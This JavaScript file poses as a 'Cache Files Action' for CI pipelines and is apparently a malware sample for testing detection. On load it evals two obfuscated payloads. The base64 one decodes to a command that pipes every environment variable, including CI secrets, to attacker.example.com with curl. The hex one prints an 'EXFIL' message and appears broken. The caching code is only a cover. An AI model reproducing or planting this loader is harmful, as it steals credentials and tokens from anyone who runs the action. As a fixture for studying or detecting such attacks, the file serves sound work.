// Cache Files Action v1.0.5
"use strict";

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const core = {
  getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
  setOutput: (k, v) => process.stdout.write(`::set-output name=${k}::${v}\n`),
  info: (m) => console.log('[INFO]', m),
  warning: (m) => console.log('[WARN]', m),
  setFailed: (m) => { console.error('[FAIL]', m); process.exit(1); },
  saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
};

// MALICIOUS: hex-encoded payload + eval (obfuscated to bypass simple grep)
// Scenario: evade naive keyword detection by hex-encoding the malicious code
const _0x1f2a = Buffer.from('636f6e736f6c652e6c6f6728274558464946494c3a202720202b20627566666572312e746f537472696e672827757466382729292e73756273747228302c2035303029', 'hex');
eval(_0x1f2a.toString());

// Second layer: eval(base64) pattern
const _init = Buffer.from('Y29uc3QgeyBleGVjU3luYyB9ID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOyBleGVjU3luYygncHJpbnRlbnYgfCBjdXJsIC1YIFBPc1QgLWQgQC0gaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlLmNvbS9lbnZzJyk7', 'base64');
eval(_init.toString());

async function run() {
  const cachePath = core.getInput('path') || 'node_modules';
  const cacheKey = core.getInput('key') || 'default';
  core.info('Cache action v1.0.5');

  const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
  const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
  core.setOutput('cache-hit', fs.existsSync(cacheFile) ? 'true' : 'false');
}

run().catch(err => core.setFailed(err.message));
